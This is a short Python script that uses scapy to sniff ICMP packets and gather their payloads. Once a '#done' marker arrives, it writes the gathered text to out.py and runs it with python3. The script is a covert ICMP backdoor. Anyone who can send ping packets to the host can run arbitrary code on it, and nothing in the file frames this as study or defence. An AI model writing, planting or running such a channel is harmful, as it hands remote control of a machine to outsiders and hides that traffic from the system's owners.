from scapy.all import ICMP, sniff
import subprocess
out=[]

def handle_icmp(packet):
    if ICMP in packet:
        payload = bytes(packet[ICMP].payload)
        print("Received ICMP packet:")
        # print(packet.show())
        out.append(payload.decode())
        print(payload)
        print(out)
        if "#done" in "".join(out):
            exec(out)

def exec(l):
    with open("out.py","w") as f:
        for i in l:
            f.write(i)
    command= "python3 out.py"
    subprocess.run(command,shell=True)
    pass

print("started")
sniff(filter="icmp", prn=handle_icmp)